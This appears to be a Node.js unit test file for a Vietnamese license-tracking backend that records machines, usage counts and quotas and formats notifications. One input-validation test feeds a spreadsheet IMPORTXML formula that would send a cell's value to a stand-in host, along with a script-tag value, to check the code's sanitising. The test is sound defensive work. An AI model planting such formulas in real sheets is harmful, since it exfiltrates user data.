// Test logic trạm license (hàm thuần trong loi.js) bằng Node: node --test dema4_rs/apps-script/test
const test = require('node:test');
const assert = require('node:assert/strict');
const L = require('../loi.js');

const MAY = { ten: 'PC-1', mac: 'AA:BB:CC:DD:EE:FF', ip_noi_bo: '192.168.1.5', ip_public: '117.5.1.1', phien_ban: '0.6.0' };
const MA = 'SM-2145-6787-A9FB';
const ML = (n) => n.toString(16).padStart(32, '0');

// Kho giả trong bộ nhớ, cùng giao diện với lớp Sheet thật trong license.gs
function khoGia() {
  const k = { may: [], hangDoi: [], nguong: [], dem: {}, soLanGoi: 0 };
  k.timMay = (ma) => { const i = k.may.findIndex((r) => r[0] === ma); return i < 0 ? null : { hang: i, giaTri: k.may[i].slice() }; };
  k.themMay = (r) => { k.may.push(r.slice()); };
  k.capNhatMay = (hang, cot) => { for (const [c, v] of Object.entries(cot)) k.may[hang][Number(c) - 1] = v; };
  k.choPhep = (khoa, gioiHan) => { k.dem[khoa] = (k.dem[khoa] || 0) + 1; return k.dem[khoa] <= gioiHan; };
  k.soTinCho = () => k.hangDoi.filter((r) => r.trang_thai === 'cho').length;
  k.xepTin = (r) => { k.hangDoi.push(r); };
  k.themNguong = (tieuDe, moTa, dong) => { k.nguong.push(dong); };
  return k;
}
const BAY_GIO = new Date('2026-11-02T08:15:00+07:00');
const goi = (k, yc) => L.xuLy(Object.assign({ ma_may: MA, nonce: 'n1', may: MAY }, yc), k, BAY_GIO);

test('dang_ky_may_moi', () => {
  const k = khoGia();
  const r = goi(k, { hanh_dong: 'kiem_tra' });
  assert.equal(r.ok, true);
  assert.deepEqual([r.du_lieu.han, r.du_lieu.da_dung, r.du_lieu.trang_thai], [10, 0, 'dung_thu']);
  assert.equal(k.may[0].length, L.SO_COT_MAY, 'dòng máy mới 14 cột');
  assert.equal(r.du_lieu.ma_may, MA); assert.equal(r.du_lieu.nonce, 'n1');
  goi(k, { hanh_dong: 'kiem_tra', may: Object.assign({}, MAY, { ten: 'TEN-MOI', ip_public: '1.2.3.4' }) });
  assert.equal(k.may.length, 1, 'không tạo dòng thứ 2');
  assert.equal(k.may[0][1], 'PC-1', 'không ghi đè tên máy');
  assert.equal(k.may[0][4], '1.2.3.4', 'IP public cập nhật theo lời gọi mới');
});

test('ghi_lan_chong_trung', () => {
  const k = khoGia();
  const lan = [{ ma_lan: ML(1), cn: 'dem', nguon: 'online' }];
  let r = goi(k, { hanh_dong: 'ghi_lan', lan });
  assert.equal(r.du_lieu.da_dung, 1);
  r = goi(k, { hanh_dong: 'ghi_lan', lan });
  assert.equal(r.du_lieu.da_dung, 1, 'cùng mã lần → không cộng');
  assert.deepEqual(r.du_lieu.da_ghi, [ML(1)], 'mã đã ghi vẫn báo để app xoá khỏi sổ');
  const bon = [2, 3, 4, 5].map((i) => ({ ma_lan: ML(i), cn: 'tach', nguon: 'bu_offline' }));
  assert.equal(goi(k, { hanh_dong: 'ghi_lan', lan: bon }).ok, false, 'quá 3 lần / lời gọi bị từ chối');
  assert.equal(k.may[0][13], ML(1), 'mã lần lưu ở cột ẩn N của dòng máy');
});

test('moi_chuc_nang_tinh_chung_mot_luot', () => {
  const k = khoGia();
  const cn = ['dem', 'tach', 'muc_luc', 'tach', 'dem'];
  cn.forEach((c, i) => goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(100 + i), cn: c, nguon: 'online' }] }));
  assert.equal(k.may[0][8], 5, 'cột I Đã dùng = tổng mọi chức năng');
  const r = goi(k, { hanh_dong: 'kiem_tra' });
  assert.equal(r.du_lieu.da_dung, 5);
  // Khoá cũ theo chức năng = số tổng → app bản cũ cũng chặn theo tổng
  for (const c of ['dem', 'tach', 'muc_luc']) assert.deepEqual([r.du_lieu['han_' + c], r.du_lieu['da_dung_' + c]], [10, 5], c);
});

test('chi_giu_ma_lan_gan_nhat', () => {
  const k = khoGia();
  for (let i = 0; i < L.GIU_MA_LAN + 5; i++) goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(200 + i), cn: 'dem', nguon: 'online' }] });
  const giu = k.may[0][13].split(',');
  assert.equal(giu.length, L.GIU_MA_LAN, 'ô không phình mãi');
  assert.equal(giu[giu.length - 1], ML(200 + L.GIU_MA_LAN + 4));
  const r = goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(200 + L.GIU_MA_LAN + 4), cn: 'dem', nguon: 'online' }] });
  assert.equal(r.du_lieu.da_dung, L.GIU_MA_LAN + 5, 'gửi lại lần gần nhất không cộng');
});

test('han_muc_va_trang_thai_tu_sheet', () => {
  const k = khoGia();
  goi(k, { hanh_dong: 'kiem_tra' });
  k.may[0][9] = 200; k.may[0][10] = 'Đã cấp';
  let r = goi(k, { hanh_dong: 'kiem_tra' });
  assert.deepEqual([r.du_lieu.han, r.du_lieu.han_tach, r.du_lieu.trang_thai], [200, 200, 'da_cap']);
  for (const [o, ma] of [['Khoá', 'khoa'], ['Khóa', 'khoa'], ['Dùng thử', 'dung_thu'], ['', 'dung_thu'], ['abc', 'khoa'], ['đã cấp', 'khoa']]) {
    k.may[0][10] = o;
    assert.equal(goi(k, { hanh_dong: 'kiem_tra' }).du_lieu.trang_thai, ma, `"${o}"`);
  }
  k.may[0][9] = 'nhiều';
  assert.equal(goi(k, { hanh_dong: 'kiem_tra' }).du_lieu.han, 0, 'hạn mức không phải số → 0');
  k.may[0][9] = '';
  assert.equal(goi(k, { hanh_dong: 'kiem_tra' }).du_lieu.han, 10, 'ô trống → 10 lần dùng thử');
});

test('kiem_dau_vao', () => {
  const k = khoGia();
  assert.equal(L.xuLy({ hanh_dong: 'kiem_tra', ma_may: 'SM-XYZ', nonce: 'n', may: MAY }, k, BAY_GIO).loi, 'ma_may');
  assert.equal(goi(k, { hanh_dong: 'la' }).loi, 'hanh_dong');
  assert.equal(goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: 'x', cn: 'dem' }] }).loi, 'lan');
  assert.equal(goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(9), cn: 'in' }] }).loi, 'lan');
  goi(k, { hanh_dong: 'kiem_tra', may: Object.assign({}, MAY, { ten: '=IMPORTXML("https://x/?"&B2;"//a")\u0007', ip_public: 'evil<script>' }) });
  assert.ok(k.may[0][1].startsWith("'="), 'ô bắt đầu bằng = được thêm dấu nháy');
  assert.ok(!k.may[0][1].includes('\u0007'), 'bỏ ký tự điều khiển');
  assert.equal(k.may[0][4], '?', 'IP lạ → ?');
  assert.equal(L.oChu('+1'), "'+1"); assert.equal(L.oChu('-x'), "'-x"); assert.equal(L.oChu('@a'), "'@a"); assert.equal(L.oChu('abc'), 'abc');
});

const MAY_TIN = { ten: 'ABC', mac: 'AA:BB:CC:DD:EE:FF', ip_noi_bo: '192.168.1.5', ip_public: '117.5.1.1', phien_ban: '1.0.0' };
const PHAN_MAY = 'Thông tin máy tính\n- Mã máy: ' + MA + '\n- Tên PC: ABC\n- Địa chỉ MAC: AA:BB:CC:DD:EE:FF\n- IP nội bộ: 192.168.1.5\n- IP public: 117.5.1.1\n- Phiên bản: 1.0.0\n-----------------\nThông tin chức năng\n';

test('tin_dem_chu_thuong_hai_phan', () => {
  assert.equal(L.tinDem(MA, MAY_TIN, { thu_muc: '/Users/quangtv/Documents', so_file: 4, so_trang: 78, quy_a4: 128.5, canh_bao: 0, file_loi: 1, thoi_gian_ms: 65400 }, '26.10.2026, 19:05:30', { da_dung: 3, han: 10 }),
    '📊 ĐẾM TRANG A4 (3/10)\n\n' + PHAN_MAY +
    '- Thư mục: /Users/quangtv/Documents\n- File PDF: 4\n- Số trang: 78\n- Quy ra A4: 128,5\n- Cảnh báo: 0\n- File lỗi: 1\n- Thời điểm: 26.10.2026, 19:05:30\n- Thời gian chạy: 1 phút, 5,4 giây');
});

test('tin_tach_chu_thuong_hai_phan', () => {
  const sl = { thu_muc: '/a/<b>', ho_so: 2, van_ban: 1211, so_trang: 476, bo_index: 209, bo_trang: 1, split: 0, sao_nguyen: 0, ho_so_loi: 0, thoi_gian_ms: 1200 };
  const tk = { trang_tu_dong: 120, trang_tu_dong_sua: 2, nghi: 30, nghi_thanh_trang: 25, nghi_giu: 5, trang_lot: 1, de_xuat: [0.9, 3.4], xoay_xac_nhan: 7, xoay_chinh: 1, xoay_0: 2 };
  assert.equal(L.tinTach(MA, MAY_TIN, sl, { tk: tk, t1: 1, t2: 3.2 }, '29.10.2026, 11:30:00', { da_dung: 7, han: 100 }),
    '✂️ TÁCH VĂN BẢN (7/100)\n\n' + PHAN_MAY +
    '- Thư mục: /a/<b>\n- Hồ sơ: 2\n- Văn bản: 1.211\n- Số trang: 476\n- Bỏ index: 209\n- Bỏ trắng: 1\n- Split: 0\n- Sao nguyên: 0\n- Hồ sơ lỗi: 0\n' +
    '- Thời điểm: 29.10.2026, 11:30:00\n- Thời gian chạy: 0 phút, 1,2 giây\n' +
    '- Ngưỡng trắng / nghi: 1,00 % / 3,20 %\n- Trắng tự động: 120 (sửa 2)\n- Nghi trắng: 30 → Trắng 25 · giữ 5\n- Trắng lọt: 1\n- Đề xuất lô: 0,90 / 3,40\n- Xoay: xác nhận 7 · chỉnh 1 · 0° 2');
  assert.ok(!L.tinTach(MA, MAY_TIN, sl, null, 't').includes('Ngưỡng'), 'không có thống kê ngưỡng → bỏ phần ngưỡng');
  assert.ok(L.tinTach(MA, MAY_TIN, sl, null, 't').startsWith('✂️ TÁCH VĂN BẢN\n'), 'không có dòng máy → tiêu đề không kèm (x/y)');
  assert.ok(L.tinTach(MA, MAY_TIN, sl, { tk: {}, t1: 1, t2: 3 }, 't').includes('- Đề xuất lô: chưa đủ dữ liệu'));
  assert.equal(L.soNguyen(1234567), '1.234.567'); assert.equal(L.soThuc(885.5), '885,5'); assert.equal(L.soThuc(885), '885');
});

test('tin_may_moi_va_het_luot', () => {
  assert.equal(L.tinMayMoi(MA, MAY_TIN, '30.10.2026, 20:00:00'),
    '🆕 MÁY MỚI ĐĂNG KÝ\n\n' + PHAN_MAY + '- Dùng thử: 10 lần (dùng chung Đếm · Tách · Sinh mục lục)\n- Thời điểm: 30.10.2026, 20:00:00');
  assert.equal(L.tinHetLuot(MA, MAY_TIN, 'tach', 10, 10, 'dung_thu', '30.10.2026, 20:05:00'),
    '⛔ HẾT LƯỢT\n\n' + PHAN_MAY + '- Lần cuối: Tách\n- Đã dùng: 10/10\n- Trạng thái: Dùng thử\n- Thời điểm: 30.10.2026, 20:05:00\n- Cấp thêm: tab 1_license → sửa Hạn mức (tổng mới) + Trạng thái Đã cấp');
});

test('thong_ke_xep_hang_doi', () => {
  const k = khoGia();
  const r = goi(k, { hanh_dong: 'thong_ke_dem', so_lieu: { thu_muc: '/x', so_file: 1, so_trang: 2, quy_a4: 2, canh_bao: 0, file_loi: 0, thoi_gian_ms: 1000 } });
  assert.equal(r.ok, true);
  assert.equal(k.hangDoi.length, 1); assert.equal(k.hangDoi[0].trang_thai, 'cho');
  assert.equal(k.hangDoi[0].ma.length, 32);
  const t = goi(k, { hanh_dong: 'thong_ke_tach', so_lieu: { thu_muc: '/y', ho_so: 1, van_ban: 2, so_trang: 3, bo_index: 0, bo_trang: 0, split: 0, sao_nguyen: 0, ho_so_loi: 0, thoi_gian_ms: 500 },
    nguong: { t1: 1, t2: 3.2, tk: { trang_tu_dong: 1 }, csv: 'v_tu;v_den;trang;noi_dung\n0.0;0.1;1;0\n', ten_csv: 'nguong_y.csv', tieu_de: ['A'], mo_ta: [['A', 'b', 'c']], dong: ['x', 'y', 'z', 'w', 'v', 'u'] } });
  assert.equal(t.ok, true);
  assert.equal(k.hangDoi[1].ten_csv, 'nguong_y.csv');
  assert.equal(k.nguong.length, 1);
  assert.deepEqual(k.nguong[0].slice(1, 5), ['PC-1', 'AA:BB:CC:DD:EE:FF', '192.168.1.5', '117.5.1.1'], 'ô máy / IP lấy từ lời gọi, không tin dòng app gửi');
});

test('gioi_han_toan_cuc', () => {
  const k = khoGia();
  let loi = null;
  for (let i = 0; i < 31; i++) {
    const ma = 'SM-' + [i, 0, 0].map((x) => x.toString(16).toUpperCase().padStart(4, '0')).join('-');
    const r = L.xuLy({ hanh_dong: 'kiem_tra', ma_may: ma, nonce: 'n', may: MAY }, k, BAY_GIO);
    if (!r.ok) loi = [i, r.loi];
  }
  assert.deepEqual(loi, [30, 'ban'], 'đăng ký thứ 31 trong giờ bị chặn');
});

test('hang_doi_ngan_sach', () => {
  const now = Date.parse('2026-11-02T08:00:00Z');
  const ds = [];
  for (let i = 0; i < 10; i++) ds.push({ ma: 'm' + i, ten_csv: 'n.csv', csv: 'x', trang_thai: 'cho', luc: 0 });
  ds.push({ ma: 'cu', trang_thai: 'dang_gui', luc: now - 6 * 60 * 1000 });
  const chon = L.chonGui(ds, now, 15);
  assert.equal(chon.traVe.length, 1, '"đang gửi" quá 5 phút → về chờ');
  const soLoiGoi = chon.gui.reduce((s, r) => s + (r.ten_csv ? 2 : 1), 0);
  assert.ok(soLoiGoi <= 15, `ngân sách ${soLoiGoi}`);
  assert.equal(chon.gui.length, 7, '7 tin Tách × 2 lời gọi = 14');
  assert.ok(chon.gui.every((r) => r.ma.startsWith('m')));
});

test('bao_may_moi_mot_lan', () => {
  const k = khoGia();
  goi(k, { hanh_dong: 'kiem_tra' });
  goi(k, { hanh_dong: 'kiem_tra' });
  const moi = k.hangDoi.filter((h) => h.noi_dung.includes('MÁY MỚI'));
  assert.equal(moi.length, 1, 'chỉ báo lần đăng ký đầu');
  assert.ok(moi[0].noi_dung.includes(MA) && moi[0].noi_dung.includes('PC-1') && moi[0].noi_dung.includes('Dùng thử: 10 lần (dùng chung'), moi[0].noi_dung);
});

test('bao_het_luot_khi_cham_han', () => {
  const k = khoGia();
  goi(k, { hanh_dong: 'kiem_tra' });
  k.may[0][9] = 2; // Hạn mức (chung) = 2
  const het = () => k.hangDoi.filter((h) => h.noi_dung.includes('HẾT LƯỢT'));
  goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(301), cn: 'dem', nguon: 'online' }] });
  assert.equal(het().length, 0, 'còn 1 lượt → chưa báo');
  goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(302), cn: 'tach', nguon: 'online' }] });
  assert.equal(het().length, 1, 'lần Tách làm chạm hạn mức chung');
  assert.ok(het()[0].noi_dung.includes('Lần cuối: Tách') && het()[0].noi_dung.includes('2/2') && het()[0].noi_dung.includes(MA), het()[0].noi_dung);
  goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(302), cn: 'tach', nguon: 'online' }] });
  goi(k, { hanh_dong: 'kiem_tra' });
  assert.equal(het().length, 1, 'gửi lại / kiểm tra lại không báo thêm');
  goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(303), cn: 'muc_luc', nguon: 'online' }] });
  assert.equal(het().length, 1, 'đã quá hạn từ trước → không báo lại');
});

test('tin_dem_tach_co_tieu_de_rieng', () => {
  const k = khoGia();
  goi(k, { hanh_dong: 'thong_ke_dem', so_lieu: { thu_muc: '/x', so_file: 1, so_trang: 2, quy_a4: 2, canh_bao: 0, file_loi: 0, thoi_gian_ms: 1000 } });
  goi(k, { hanh_dong: 'thong_ke_tach', so_lieu: { thu_muc: '/y', ho_so: 1, van_ban: 2, so_trang: 3, bo_index: 0, bo_trang: 0, split: 0, sao_nguyen: 0, ho_so_loi: 0, thoi_gian_ms: 500 } });
  assert.ok(k.hangDoi[0].noi_dung.startsWith('📊 ĐẾM TRANG A4\n\nThông tin máy tính\n- Mã máy: ' + MA), 'máy chưa đăng ký → không có (x/y)');
  assert.ok(k.hangDoi[1].noi_dung.startsWith('✂️ TÁCH VĂN BẢN\n\nThông tin máy tính\n- Mã máy: ' + MA), k.hangDoi[1].noi_dung);
  goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(501), cn: 'dem', nguon: 'online' }] });
  k.may[0][9] = 50;
  goi(k, { hanh_dong: 'thong_ke_dem', so_lieu: { thu_muc: '/x', so_file: 1, so_trang: 2, quy_a4: 2, canh_bao: 0, file_loi: 0, thoi_gian_ms: 1000 } });
  goi(k, { hanh_dong: 'thong_ke_tach', so_lieu: { thu_muc: '/y', ho_so: 1, van_ban: 2, so_trang: 3, bo_index: 0, bo_trang: 0, split: 0, sao_nguyen: 0, ho_so_loi: 0, thoi_gian_ms: 500 } });
  const cuoi = k.hangDoi.slice(-2).map((h) => h.noi_dung.split('\n')[0]);
  assert.deepEqual(cuoi, ['📊 ĐẾM TRANG A4 (1/50)', '✂️ TÁCH VĂN BẢN (1/50)'], 'đã dùng / hạn mức chung lấy từ dòng máy');
});

test('chuyen_bang_cu_cong_ba_chuc_nang', () => {
  // Dòng bảng cũ 18 cột: I/J/Q đã dùng, K/L/R hạn mức (trống = 10), M trạng thái, N đơn vị, O ghi chú, P mã lần
  const cu = [MA, 'PC', 'MAC', 'ip1', 'ip2', '1.0.0', 'ngay', 'cuoi', 37, 2, 200, '', 'Đã cấp', 'Sở X', 'HĐ 1', 'abc', 4, 50];
  assert.deepEqual(L.chuyenDongCu(cu), [MA, 'PC', 'MAC', 'ip1', 'ip2', '1.0.0', 'ngay', 'cuoi', 43, 260, 'Đã cấp', 'Sở X', 'HĐ 1', 'abc']);
  const cu16 = cu.slice(0, 16); // dòng do trạm cũ tạo chưa có cột Mục lục → 0 đã dùng, hạn mức 10
  assert.deepEqual(L.chuyenDongCu(cu16).slice(8, 10), [39, 220]);
  assert.equal(L.TIEU_DE_COT_J_CU, 'Đã dùng Tách');
});

test('muc_luc_tin_thong_ke_va_het_luot', () => {
  const k = khoGia();
  goi(k, { hanh_dong: 'kiem_tra' });
  k.may[0][9] = 1;
  goi(k, { hanh_dong: 'ghi_lan', lan: [{ ma_lan: ML(901), cn: 'muc_luc', nguon: 'online' }] });
  assert.equal(k.hangDoi.slice(-1)[0].noi_dung.split('\n')[0], '⛔ HẾT LƯỢT');
  const tk = goi(k, { hanh_dong: 'thong_ke_muc_luc', so_lieu: { du_lieu: '/a/Bien_muc.xlsx', mau: 'Mẫu 01 – Quảng Trị', ho_so: 22, van_ban: 326, docx: 22, pdf: 0, loi: 1, thoi_gian_ms: 16000 } });
  assert.equal(tk.ok, true);
  const tin = k.hangDoi.slice(-1)[0].noi_dung;
  assert.equal(tin.split('\n')[0], '📑 SINH MỤC LỤC (1/1)');
  for (const d of ['- Dữ liệu: /a/Bien_muc.xlsx', '- Mẫu: Mẫu 01 – Quảng Trị', '- Hồ sơ: 22', '- Văn bản: 326', '- File ra: 22 DOCX · 0 PDF', '- Lỗi: 1']) assert.ok(tin.includes(d), d);
});
